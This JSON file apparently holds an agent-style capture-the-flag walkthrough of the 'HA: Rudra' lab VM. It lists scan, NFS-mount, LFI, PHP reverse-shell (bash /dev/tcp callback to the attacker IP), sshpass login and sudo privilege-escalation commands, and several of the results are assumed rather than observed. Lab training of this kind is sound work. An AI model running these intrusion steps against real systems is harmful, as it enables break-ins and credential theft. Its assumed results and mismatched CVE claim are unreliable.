@@ -1,0 +1,191 @@
+{
+    "initial_prompt": "Objective: Identify and exploit vulnerabilities on the target machine HA: Rudra (IP: 192.168.1.101) to gain initial access, escalate privileges, and ultimately retrieve the root flag (`final.txt`).\nAttack Machine: Kali 2024 (assumed IP: 192.168.1.102 for reverse shell purposes).\nTarget Machine: HA: Rudra (IP: 192.168.1.101).",
+    "steps": [
+        {
+            "step_number": 1,
+            "thought": "Identify the IP address of the target machine on the network. Assuming the Kali machine is on the same network segment (e.g., 192.168.1.0/24). Netdiscover requires root privileges.",
+            "command": "sudo netdiscover -r 192.168.1.0/24 -P",
+            "result": "Netdiscover scans the 192.168.1.0/24 range passively. The output will list discovered hosts. The target machine with IP 192.168.1.101 should be identified among them."
+        },
+        {
+            "step_number": 2,
+            "thought": "Perform an aggressive scan on the identified target IP to enumerate open ports, services, and OS version.",
+            "command": "nmap -A 192.168.1.101",
+            "result": "Nmap scan completes. Output indicates open ports: 22/tcp (SSH), 80/tcp (HTTP - Apache httpd), and 2049/tcp (NFS). Service versions and OS details are also provided."
+        },
+        {
+            "step_number": 3,
+            "thought": "Check for exported NFS shares on the target machine.",
+            "command": "showmount -e 192.168.1.101",
+            "result": "Output from showmount lists exported directories. '/home/shivay' is listed as exported to '*' (everyone)."
+        },
+        {
+            "step_number": 4,
+            "thought": "Create a local directory to mount the discovered NFS share.",
+            "command": "mkdir /tmp/rudra_nfs_share",
+            "result": "Directory '/tmp/rudra_nfs_share' created successfully on the Kali machine."
+        },
+        {
+            "step_number": 5,
+            "thought": "Mount the NFS share '/home/shivay' to the local directory. This requires root privileges.",
+            "command": "sudo mount -t nfs 192.168.1.101:/home/shivay /tmp/rudra_nfs_share",
+            "result": "The NFS share '/home/shivay' from 192.168.1.101 is mounted to '/tmp/rudra_nfs_share' on the Kali machine."
+        },
+        {
+            "step_number": 6,
+            "thought": "List the contents of the mounted NFS share to look for any interesting files.",
+            "command": "ls -la /tmp/rudra_nfs_share",
+            "result": "Lists files and directories within the mounted share. A file named 'mahadev.txt' is observed."
+        },
+        {
+            "step_number": 7,
+            "thought": "Read the content of 'mahadev.txt'. Although the original walkthrough didn't find it immediately useful, it's good practice to check all found files.",
+            "command": "cat /tmp/rudra_nfs_share/mahadev.txt",
+            "result": "Content of 'mahadev.txt' is displayed. (The specific content is not detailed in the walkthrough as a critical hint at this stage)."
+        },
+        {
+            "step_number": 8,
+            "thought": "Use Dirb to discover web content, specifically looking for files like robots.txt or other interesting endpoints on the HTTP server.",
+            "command": "dirb http://192.168.1.101",
+            "result": "Dirb scans the web server using its default wordlist. Output lists discovered paths, including '/robots.txt' (CODE:200)."
+        },
+        {
+            "step_number": 9,
+            "thought": "Retrieve and examine the 'robots.txt' file found by Dirb.",
+            "command": "curl http://192.168.1.101/robots.txt",
+            "result": "Output from curl: \nUser-agent: *\nDisallow: /nandi.php"
+        },
+        {
+            "step_number": 10,
+            "thought": "Access the '/nandi.php' page disallowed in robots.txt to see its content.",
+            "command": "curl http://192.168.1.101/nandi.php",
+            "result": "The command returns a blank page. This behavior can sometimes indicate a Local File Inclusion (LFI) vulnerability if the page expects a file parameter."
+        },
+        {
+            "step_number": 11,
+            "thought": "Test for LFI vulnerability on 'nandi.php' by trying to include '/etc/passwd'.",
+            "command": "curl \"http://192.168.1.101/nandi.php?file=/etc/passwd\"",
+            "result": "The contents of the target machine's '/etc/passwd' file are displayed, confirming the LFI vulnerability. Usernames such as 'rudra', 'shivay', and 'mahakaal' are visible."
+        },
+        {
+            "step_number": 12,
+            "thought": "Prepare a PHP reverse shell payload on the Kali machine and save it to the mounted NFS share, making it accessible on the target via '/home/shivay/rev_shell.php'. The shell will connect back to Kali IP 192.168.1.102 on port 4444.",
+            "command": "echo '<?php exec(\"/bin/bash -c \\'bash -i >& /dev/tcp/192.168.1.102/4444 0>&1\\'\"); ?>' > /tmp/rudra_nfs_share/rev_shell.php",
+            "result": "PHP reverse shell script 'rev_shell.php' is created in '/tmp/rudra_nfs_share/' on Kali. This file is now at '/home/shivay/rev_shell.php' on the target via NFS."
+        },
+        {
+            "step_number": 13,
+            "thought": "Start a Netcat listener on Kali (port 4444) to catch the incoming reverse shell connection.",
+            "command": "nc -lvnp 4444",
+            "result": "Netcat listener starts on port 4444 on the Kali machine, displaying 'listening on [any] 4444 ...'. It will wait for an incoming connection."
+        },
+        {
+            "step_number": 14,
+            "thought": "Trigger the PHP reverse shell on the target by accessing it through the LFI vulnerability in 'nandi.php'.",
+            "command": "curl \"http://192.168.1.101/nandi.php?file=/home/shivay/rev_shell.php\"",
+            "result": "The curl command executes. Simultaneously, the Netcat listener on Kali should receive a connection. A shell prompt (e.g., '$' or '#') from the target machine appears in the Netcat terminal, typically as the 'www-data' user."
+        },
+        {
+            "step_number": 15,
+            "thought": "Stabilize the reverse shell for better interactivity (optional but recommended). This command is run in the newly acquired www-data shell on the target.",
+            "command": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+            "result": "The shell is upgraded to a more stable, interactive TTY bash shell within the Netcat session."
+        },
+        {
+            "step_number": 16,
+            "thought": "Perform internal reconnaissance on the target. Check active network connections, looking for interesting services. This command is run in the www-data shell.",
+            "command": "netstat -tulnp",
+            "result": "Output lists listening TCP and UDP ports. A MySQL service (mysqld) is observed listening on 127.0.0.1:3306."
+        },
+        {
+            "step_number": 17,
+            "thought": "Attempt to connect to the local MySQL service as root (often configured with no password or a default one) and list databases. This command is run in the www-data shell.",
+            "command": "mysql -u root -e \"SHOW DATABASES;\"",
+            "result": "Successfully connects to MySQL (or shows an error if credentials are required and incorrect). A list of databases is displayed, including 'information_schema', 'mysql', 'performance_schema', and 'mahadev'."
+        },
+        {
+            "step_number": 18,
+            "thought": "Explore the 'mahadev' database by listing its tables. This command is run in the www-data shell.",
+            "command": "mysql -u root -e \"USE mahadev; SHOW TABLES;\"",
+            "result": "Lists tables within the 'mahadev' database. A table named 'hint' is found."
+        },
+        {
+            "step_number": 19,
+            "thought": "Retrieve all records from the 'hint' table in the 'mahadev' database. This command is run in the www-data shell.",
+            "command": "mysql -u root -e \"SELECT * FROM mahadev.hint;\"",
+            "result": "Displays the content of the 'hint' table. A single record is found containing the text: 'check in media filesystem'."
+        },
+        {
+            "step_number": 20,
+            "thought": "Investigate the '/media' directory as hinted by the MySQL record. This command is run in the www-data shell.",
+            "command": "ls -la /media",
+            "result": "Lists files in '/media'. Two files are present: 'creds' and 'hint'."
+        },
+        {
+            "step_number": 21,
+            "thought": "Read the content of the 'hint' file found in '/media'. This command is run in the www-data shell.",
+            "command": "cat /media/hint",
+            "result": "Displays the content of '/media/hint': 'Link: https://www.hackingarticles.in/cloakify-factory-a-data-exfiltration-tool-uses-text-based-steganography/\nMessage: Without noise'."
+        },
+        {
+            "step_number": 22,
+            "thought": "Examine the 'creds' file. This command is run in the www-data shell.",
+            "command": "cat /media/creds",
+            "result": "Displays a series of emoji characters, suggesting the file contains steganographically encoded data, likely using CloakifyFactory as per the hint."
+        },
+        {
+            "step_number": 23,
+            "thought": "Copy the 'creds' file from the target's '/media' directory to the NFS share ('/home/shivay') so it can be accessed from the Kali machine. This command is run in the www-data shell.",
+            "command": "cp /media/creds /home/shivay/creds_from_target.txt",
+            "result": "File 'creds' is copied to '/home/shivay/creds_from_target.txt' on the target. This file is now accessible at '/tmp/rudra_nfs_share/creds_from_target.txt' on Kali."
+        },
+        {
+            "step_number": 24,
+            "thought": "Clone the CloakifyFactory tool from GitHub to the Kali machine, if not already present.",
+            "command": "git clone https://github.com/TryCatchHCF/Cloakify.git ~/CloakifyFactory",
+            "result": "CloakifyFactory repository is cloned into '~/CloakifyFactory' on the Kali machine. If it already exists, git will indicate this."
+        },
+        {
+            "step_number": 25,
+            "thought": "Use CloakifyFactory on Kali to decode 'creds_from_target.txt'. The inputs (2 for decloakify, input file path, output file path, N for no noise, 3 for emoji cipher) are piped to the script.",
+            "command": "echo -e \"2\\n/tmp/rudra_nfs_share/creds_from_target.txt\\n~/decoded_creds.txt\\nN\\n3\" | python3 ~/CloakifyFactory/cloakifyFactory.py",
+            "result": "CloakifyFactory processes the inputs: selects decloakify mode, uses '/tmp/rudra_nfs_share/creds_from_target.txt' as input, specifies '~/decoded_creds.txt' as output, selects 'No' for adding noise, and chooses the emoji cipher. The decrypted content is saved to '~/decoded_creds.txt'."
+        },
+        {
+            "step_number": 26,
+            "thought": "View the decrypted credentials on the Kali machine.",
+            "command": "cat ~/decoded_creds.txt",
+            "result": "Displays the content of '~/decoded_creds.txt'. The credentials are: Username: mahakaal, Password: kalbhairav."
+        },
+        {
+            "step_number": 27,
+            "thought": "Log into the target machine (192.168.1.101) via SSH using the 'mahakaal' credentials. Use sshpass for non-interactive login. If sshpass is not installed, run 'sudo apt update && sudo apt install -y sshpass' first on Kali.",
+            "command": "sshpass -p 'kalbhairav' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null mahakaal@192.168.1.101 \"whoami && hostname\"",
+            "result": "Successfully logs into the target machine as 'mahakaal'. The command output will be:\nmahakaal\nrudra (or the target's actual hostname)"
+        },
+        {
+            "step_number": 28,
+            "thought": "Check sudo privileges for the 'mahakaal' user on the target machine. This command is run in the SSH session as mahakaal.",
+            "command": "sudo -l",
+            "result": "Output displays sudo permissions for mahakaal: 'User mahakaal may run the following commands on rudra:\n    (ALL) NOPASSWD: /usr/bin/watch'."
+        },
+        {
+            "step_number": 29,
+            "thought": "Exploit the sudo privilege on '/usr/bin/watch' (CVE-2019-14287) to escalate privileges to root. This command is run in the SSH session as mahakaal.",
+            "command": "sudo -u#-1 /usr/bin/watch -x sh -c 'reset; exec sh 1>&0 2>&0'",
+            "result": "The command executes. A new shell prompt (typically '#') appears, indicating root access has been obtained."
+        },
+        {
+            "step_number": 30,
+            "thought": "Verify current user is root. This command is run in the new root shell on the target.",
+            "command": "whoami",
+            "result": "Output: root"
+        },
+        {
+            "step_number": 31,
+            "thought": "Retrieve the final root flag from '/root/final.txt'. This command is run in the root shell on the target.",
+            "command": "cat /root/final.txt",
+            "result": "The content of 'final.txt' (the root flag) is displayed, completing the CTF challenge."
+        }
+    ]
+}
